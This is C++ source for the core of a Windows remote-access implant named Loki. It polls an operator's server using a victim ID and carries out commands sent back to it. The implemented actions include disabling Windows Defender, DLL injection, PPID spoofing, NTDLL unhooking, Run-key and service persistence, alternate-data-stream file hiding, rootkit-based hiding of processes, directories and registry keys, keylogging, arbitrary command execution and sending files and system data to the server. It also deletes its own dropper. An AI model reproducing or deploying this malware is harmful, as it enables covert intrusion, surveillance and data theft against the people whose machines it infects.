#include <Windows.h>
#include <iostream>
#include <vector>
#include <curl/curl.h>
#include <string>
#include <filesystem>
#include <ntstatus.h>
#include <unordered_map>
#include <iostream>
#include <winbase.h>
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>
#include <wchar.h>
#include "resource.h"
#include "httpRequest.h"
#include "IPC.h"
#include "NetSignature.h"
#include "TimeStomping.h"
#include "Persistence.h"
#include "Utils.h"
#include "DLLInjection.h"
#include "WinDefKiller.h"
#include "FileHiderADS.h"
#include "Enumerator.h"
#include "PEBManipulator.h"
#include "PPIDSpoofer.h"
#include "InstalAllService.h"
#include "CommandLineSpoofing.h"
#include "PrivilegeEscalation.h"
#include "Unhooker.h"
#include "FileTransfer.h"
#include "FileExplorer.h"
#include "Task.h"
#include "ListProcesses.h"
#include "UR00tk1t.h"
#include "Keylogger.h"

using namespace std;

class LokiCore{

	enum action {
		TimeStomping = 0,
		DLLInjection = 1,
		ListProcesses = 2,
		WinDefenderKiller = 3,
		HideFile = 4,
		UnhideFile = 5,
		Persistence = 6,
		CommandLineManipulation = 7,
		RDPCredStealer = 8,	
		PatchETW = 9,
		PPIDSpoofing = 10,
		InstallAsService = 11,
		CMDLineSpoofing = 12,
		ExecuteEXEAsAdmin = 13,
		UnhookNTDLL = 14,
		FileUpload = 15,
		FileDownload = 16,
		FileExplorer = 17,
		ReadFile = 18,
		RootKitSetup = 19,
		HideProcess = 20,
		HideDirectory = 21,
		HideRegistry = 22,
		ExecuteCommand = 23,
		Enumeration = 24,
		CreateTask = 25,
		Keylogger = 26,
		fakeAction = 666
	};

	public:
		string SERVER_BASE_URL_FINAL = "";
		typedef LONG NTSTATUS;

        int init() {
			IPC ipc = IPC();	
			wstring victimID1 = ipc.readFromRegistry();
			wstring domain = ipc.readDomainFromRegistry();
			deleteAgent();
			// store the domain into SERVER_BASE_URL_FINAL
			SERVER_BASE_URL_FINAL.append(domain.begin(), domain.end());
			string victimID(victimID1.begin(), victimID1.end());
			Enumerate enumerator = Enumerate();
			httpRequest http = httpRequest();
			string systemInformation = enumerator.enumerateSystem();
			string resultFinal = http.sendEnumeration(victimID, systemInformation);
			Utils utils = Utils();
			bool keyloggerActive = http.itsKeyloggerActive("121");
			if(keyloggerActive){
				KeyloggerClass keylogger = KeyloggerClass();
				keylogger.init();
			}
			string lastAction = "-1";
            while (true) {
				string action = "";
				httpRequest http = httpRequest();
				string result = http.httpNewAction(victimID);
				//outputFile << "Action: " << result << "\n";
				action = result.substr(0, result.find(","));
				if (lastAction == result.substr(result.find(",") + 1, result.length())) {
					OutputDebugStringA("Same action as last time, skipping");
					SleepImplant(5000);
					continue;
				}
				lastAction = result.substr(result.find(",") + 1, result.length());
				int actionInt = stoi(action);

				string params = "";
				string srcFile;
				string dstFile;
				char srcFileChar[MAX_PATH];
				PersistenceClass persistence;
				char dstFileChar[MAX_PATH];
				string dllPath = "";
				int pid;
				string command;
				string processName;
				string adsName;
				string name;
				string exe;
				string path;
				LPCWSTR nameLPCWSTR;
				string exeToExecute;
				string processToSpoof;
				string fileSystemRepresentation;
				string serviceName;
				string servicePath;
				TCHAR* serviceNameTCHAR;
				TCHAR* servicePathTCHAR;	
				wstring wideProcessName;
				const wchar_t*  cmdValue;
				string url;
				char* fileName;
				char* urlChar;
				string outputID;
				string filePath;
				string fileContent;
				FileTransfer fileTransfer;
				string registry;
				wstring pathWString;
				wstring processNameWString;
				wstring pathWString2;
				vector<ProcessInfo> processes;
				wstring pathWString22;
				string processesString;
				string systemInfo;
				//taskName = Backup, parameters=, command = notepad.exe, interval = 60
				string taskName;
				string parameters;
				string commandTask;
				string interval;
				size_t pos;
				size_t startPos;
				size_t endPos;
				LPCWSTR commandT;
				LPCWSTR taskNameT;
				LPCWSTR swapper;
				LPCWSTR parametersT;
				DWORD intervalT;
				wstring createTaskCommand;
				string createTaskCommandString;
				KeyloggerClass keylogger;
				

				
				switch (actionInt) {	
					case TimeStomping:
						TimeStompingClass timeStomper = TimeStompingClass();
						params = http.httpGetParamsAction(victimID, action);

						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
						dstFile = params.substr(params.find("dstFile=") + 8, params.length() - 8);

						strcpy_s(srcFileChar, srcFile.c_str());
						strcpy_s(dstFileChar, dstFile.c_str());						

						timeStomper.copyStamps(srcFileChar, dstFileChar);
						break;

					case DLLInjection:
						params = http.httpGetParamsAction(victimID, action);
						processName = params.substr(params.find("process=") + 8, params.find(",") - 8);
						dllPath = params.substr(params.find("dllPath=") + 8, params.length() - 8);

						Utils utils = Utils();
						pid = utils.getPIDbyProcName(processName);

						DLLInjector dllInjector = DLLInjector();
						dllInjector.DLLinjector(pid, dllPath.c_str());
						break;

					case ListProcesses:
						// instructions for listing processes			
						ListProcess listProcess = ListProcess();
						processes = listProcess.listAllProcesses();
						processesString = listProcess.processesToString(processes);
						http.httpSendProcesses(victimID, processesString);
						break;

					case WinDefenderKiller:
						WinDefKiller winDefKiller = WinDefKiller();
						winDefKiller.killWinDefender();
						break;
					
					case HideFile:
						params = http.httpGetParamsAction(victimID, action);

						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
						dstFile = params.substr(params.find("dstFile=") + 8, params.find(",") - 8);
						adsName = params.substr(params.find("adsName=") + 8, params.length() - 8);

						FileHider fileHider = FileHider();
						fileHider.hideFile(srcFile, dstFile, adsName);
						break;

					case UnhideFile:
						params = http.httpGetParamsAction(victimID, action);

						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
						dstFile = params.substr(params.find("dstFile=") + 8, params.find(",") - 8);
						adsName = params.substr(params.find("adsName=") + 8, params.length() - 8);

						FileHider fileHider2 = FileHider();
						fileHider2.unHideFile(srcFile, dstFile, adsName);
						break;

					case Persistence:
						params = http.httpGetParamsAction(victimID, action);
						// exe=C:\Windows\System32\notepad.exe,name=notepad
						exe = params.substr(params.find("exe=") + 4, params.find(",") - 4);
						name = params.substr(params.find("name=") + 5, params.length() - 5);

						nameLPCWSTR = utils.convertStringToLPCWSTR(name);
						persistence = PersistenceClass();
						persistence.persistenceViaRunKeys(exe.c_str(), nameLPCWSTR);
						
						break;

					case CommandLineManipulation:
						// instructions for command line manipulation
						break;

					case RDPCredStealer:
						// instructions for RDP credential stealer
						break;

					case PatchETW:
						// instructions for patching ETW
						break;

					case PPIDSpoofing:
						params = http.httpGetParamsAction(victimID, action);
						exeToExecute = params.substr(params.find("exeToExecute=") + 13, params.find(",") - 13);
						processToSpoof = params.substr(params.find("processToSpoof=") + 15, params.length() - 15);

						PPIDSpoofer pids = PPIDSpoofer();
						pid = utils.getPIDbyProcName(processToSpoof.c_str());
						pids.SpoofNewProcess(exeToExecute.c_str(), pid);
						break;

					case InstallAsService:
						// instructions for Install EXE as service
						params = http.httpGetParams(victimID, action);

						serviceName = params.substr(params.find("serviceName=") + 12, params.find(",") - 12);
						servicePath = params.substr(params.find("servicePath=") + 12, params.length() - 12);

						serviceNameTCHAR = (TCHAR*)serviceName.c_str();
						servicePathTCHAR = (TCHAR*)servicePath.c_str();

						Installer installer = Installer();
						installer.InstallService(serviceNameTCHAR, servicePathTCHAR);
						break;

					case CMDLineSpoofing:
						// 12
						break;

					case ExecuteEXEAsAdmin:
						params = http.httpGetParams(victimID, action);
						processName = params.substr(params.find("process=") + 8, params.length() - 8);
						PrivilegeEscalationClass privEsc = PrivilegeEscalationClass();

						wideProcessName = wstring(processName.begin(), processName.end());
						cmdValue = wideProcessName.c_str();
						privEsc.runProcAsAdminFromUser(cmdValue);
						break;

					case UnhookNTDLL:
						params = http.httpGetParams(victimID, action);
						Unhooker unhooker = Unhooker();

						processName = params.substr(params.find("process=") + 8, params.length() - 8);
						pid = utils.getPIDbyProcName(processName.c_str());
						unhooker.unHookNtdllRemote(pid);
						break;

					case FileUpload:
						params = http.httpGetParams(victimID, action);
						url = params.substr(params.find("url=") + 4, params.find(",") - 4);
						srcFile = params.substr(params.find("filePath=") + 9, params.length() - 9);
						urlChar = (char*)url.c_str();
						fileName = (char*)srcFile.c_str();

						fileTransfer = FileTransfer();
						fileTransfer.fileDownload(fileName,urlChar);
						break;

					case FileDownload:
						params = http.httpGetParams(victimID, action);
						outputID = params.substr(params.find("outputID=") + 9, params.length() - 9);
						url = SERVER_BASE_URL_FINAL;
						
						url.append("/Output");
						urlChar = (char*)url.c_str();

						fileTransfer = FileTransfer();
						fileTransfer.fileUpload(outputID, urlChar);

						break;

					case FileExplorer:
						params = http.httpGetParams(victimID, action);
						path = params.substr(params.find("path=") + 5, params.length() - 5);
						FileSystemTree fileExplorer = FileSystemTree();
						fileSystemRepresentation = fileExplorer.getAllPaths(path);
						http.httpSendFileSystemStructure(victimID, "17", fileSystemRepresentation);
						break;
					
					case ReadFile:
						params = http.httpGetParams(victimID, action);
						path = params.substr(params.find("path=") + 5, params.length() - 5);
						FileSystemTree fileExplorer1 = FileSystemTree();
						fileContent = fileExplorer1.readFile(path);
						std::replace(fileContent.begin(), fileContent.end(), '"', '\'');
						replaceAll(fileContent, "\n", "-;-n");
						replaceAll(fileContent, "\r", "-;-r");
						replaceAll(fileContent, "\t", "-;-t");
						http.httpSendFileSystemStructure(victimID, "18", fileContent);
						break;

					case fakeAction:
						// instructions for fake action
						break;

					case RootKitSetup:
						URtkit rootKit = URtkit();
						rootKit.downloadDLLs(domain);
						pathWString = rootKit.findFileDirectory(L"SystemR.exe");
						pathWString = pathWString + L"\\SystemR.exe";
						privEsc.runProcAsAdminFromUser(pathWString.c_str());
						http.rootkitInitialitzated(victimID);

						break;

					case HideProcess:
						params = http.httpGetParams(victimID, action);
						processName = params.substr(params.find("process=") + 8, params.length() - 8);
						processNameWString = wstring(processName.begin(), processName.end());
						pathWString22 = utils.findFileDirectoryW(L"SystemR.exe");
						pathWString22 = pathWString22 + L"\\" + L"SystemR.exe process hide " + processNameWString;
						privEsc.runProcAsAdminFromUser(pathWString22.c_str());
						break;

					case HideDirectory:
						params = http.httpGetParams(victimID, action);
						path = params.substr(params.find("path=") + 5, params.length() - 5);
						pathWString = wstring(path.begin(), path.end());
						filePath = utils.findFilePath("SystemR.exe");
						//path = "C:/Users/Public/Music";
						filePath =  filePath + " path hide " + path;
						pathWString2 = wstring(filePath.begin(), filePath.end());
						privEsc.runProcAsAdminFromUser(pathWString2.c_str());
						break;

					case HideRegistry:
						params = http.httpGetParams(victimID, action);
						registry = params.substr(params.find("registry=") + 9, params.length() - 9);
						pathWString = wstring(registry.begin(), registry.end());
						filePath = utils.findFilePath("SystemR.exe");
  						filePath = filePath + " registry hide " + registry;
						pathWString2 = wstring(filePath.begin(), filePath.end());
						privEsc.runProcAsAdminFromUser(pathWString2.c_str());
						break;

					case ExecuteCommand:
						params = http.httpGetParams(victimID, action);
						command = params.substr(params.find("command=") + 8, params.length() - 8);
						pathWString = wstring(command.begin(), command.end());
						privEsc.runProcAsAdminFromUser(pathWString.c_str());
						break;

					case Enumeration:
						// no params needed
						Enumerate enumerator = Enumerate();
						systemInfo = enumerator.enumerateSystem();		
						result = http.sendEnumeration(victimID, systemInfo);
						break;

					case CreateTask:
						params = http.httpGetParams(victimID, action);
						// params = taskName=Backup,parameters=,command=notepad.exe,interval=60
						// parameters can be empty
						taskName = params.substr(params.find("taskName=") + 9, params.find(",") - 9);
						// split the parameters by comma
						parameters = params.substr(params.find("parameters=") + 11, params.find("command=") - 11);
						parameters = parameters.substr(0, parameters.find(","));
						commandTask = params.substr(params.find("command=") + 8, params.find("interval=") - 8);
						commandTask = commandTask.substr(0, commandTask.find(","));
						interval = params.substr(params.find("interval=") + 9, params.length() - 9);
						commandT = utils.convertStringToLPCWSTR(commandTask);
						parametersT = utils.convertStringToLPCWSTR(parameters);
						taskNameT = utils.convertStringToLPCWSTR(taskName);
						intervalT = static_cast<DWORD>(std::stoul(interval));
						//schtasks /create /sc MINUTE /tn "NotepadTask" /tr "notepad.exe" /mo 3
						createTaskCommandString = "schtasks /create /sc MINUTE /tn '" + taskName + "' /tr '" + commandTask + "' /mo " + interval;
						createTaskCommand = wstring(createTaskCommandString.begin(), createTaskCommandString.end());
						privEsc.runProcAsAdminFromUser(createTaskCommand.c_str());
						break;

					case Keylogger:
						// create a keylogger if its actived add in the start of this code 
						keylogger.init();
						break;
				}

                OutputDebugStringA(result.c_str());
                SleepImplant(5000);
            }

            return 0;
        }

	private:

		void replaceAll(std::string& str, const std::string& from, const std::string& to) {
			size_t start_pos = 0;
			while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
				str.replace(start_pos, from.length(), to);
				start_pos += to.length(); 
			}
		}


		bool SleepImplant(DWORD dwMilliseconds) {
			HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (hEvent == NULL) {
				return false;
			}
			HANDLE hTimer = NULL;
			LARGE_INTEGER liDueTime;
			liDueTime.QuadPart = -10000LL * dwMilliseconds;
			hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
			if (hTimer == NULL) {
				CloseHandle(hEvent);
				return false;
			}
			if (!SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
				CloseHandle(hEvent);
				CloseHandle(hTimer);
				return false;
			}
			if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0) {
				CloseHandle(hEvent);
				CloseHandle(hTimer);
				return false;
			}
			CloseHandle(hEvent);
			CloseHandle(hTimer);
			return true;
		}

		static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
			size_t total_size = size * nmemb;
			output->append(static_cast<char*>(contents), total_size);
			return total_size;
		}

		BOOL InstallService(const TCHAR* serviceName, const TCHAR* servicePath) {
			SC_HANDLE schSCManager = NULL;
			SC_HANDLE schService = NULL;
			BOOL success = FALSE;

			schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
			if (schSCManager == NULL) {
				return false;
			}

			schService = CreateService(
				schSCManager,
				serviceName,
				serviceName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS,
				SERVICE_AUTO_START,
				SERVICE_ERROR_NORMAL,
				servicePath,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL
			);

			if (schService == NULL) {
				return false;
			}

			success = TRUE;

			if (schService != NULL) {
				CloseServiceHandle(schService);
			}

			if (schSCManager != NULL) {
				CloseServiceHandle(schSCManager);
			}

			return success;
		}

		bool deleteAgent() {
			HMODULE hModule = GetModuleHandle(NULL);
			if (hModule == NULL) {
				return false;
			}
			char buffer[MAX_PATH];
			GetModuleFileNameA(hModule, buffer, MAX_PATH);
			std::string executablePath(buffer);

			std::string directory = executablePath.substr(0, executablePath.find_last_of("\\/"));

			std::string baseFileName = "LokiAgent";

			std::string agentFilePath = directory + "\\" + baseFileName + ".exe";
			if (remove(agentFilePath.c_str()) != 0) {
				return false;
			}

			for (int i = 0; i < 100; ++i) { 
				std::string doubleDigit = (i < 10) ? "0" + std::to_string(i) : std::to_string(i);
				std::string agentXXFilePath = directory + "\\" + baseFileName + doubleDigit + ".exe";
				if (remove(agentXXFilePath.c_str()) == 0) {
					return true; 
				}
			}
			return true;
		}


			
		
};